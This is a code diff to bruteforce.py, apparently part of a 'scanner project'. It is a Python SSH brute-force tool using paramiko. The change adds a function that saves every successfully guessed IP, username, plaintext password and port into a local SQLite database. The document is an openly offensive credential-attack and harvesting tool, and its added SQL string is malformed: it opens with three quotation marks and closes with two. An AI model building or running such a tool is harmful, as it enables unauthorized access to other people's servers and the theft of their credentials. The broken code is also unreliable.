@@ -1,8 +1,8 @@
 # Refactored and Fixed Code for the Scanner Project
 
-# Sample Fix for bruteforce.py
 import paramiko
 import logging
+import sqlite3
 
 def load_wordlists():
     """Load username and password lists for brute force attacks."""
@@ -23,6 +23,7 @@ def attempt_login(ip, username, password, port=22):
     try:
         client.connect(ip, username=username, password=password, port=port, timeout=5)
         logging.info(f"Login successful: {username}@{ip}:{port}")
+        store_successful_login(ip, username, password, port)
         return True
     except paramiko.AuthenticationException:
         logging.warning(f"Failed login: {username}@{ip}")
@@ -32,6 +33,24 @@ def attempt_login(ip, username, password, port=22):
         return False
     finally:
         client.close()
+
+def store_successful_login(ip, username, password, port):
+    """Store successful login credentials in a database."""
+    conn = sqlite3.connect("logins.db")
+    cursor = conn.cursor()
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS successful_logins (
+            ip TEXT,
+            username TEXT,
+            password TEXT,
+            port INTEGER
+        )
+    ""
+    )
+    cursor.execute("INSERT INTO successful_logins (ip, username, password, port) VALUES (?, ?, ?, ?)",
+                   (ip, username, password, port))
+    conn.commit()
+    conn.close()
 
 def bruteforce_ssh(ip, port=22):
     """Perform an SSH brute-force attack on the given IP."""
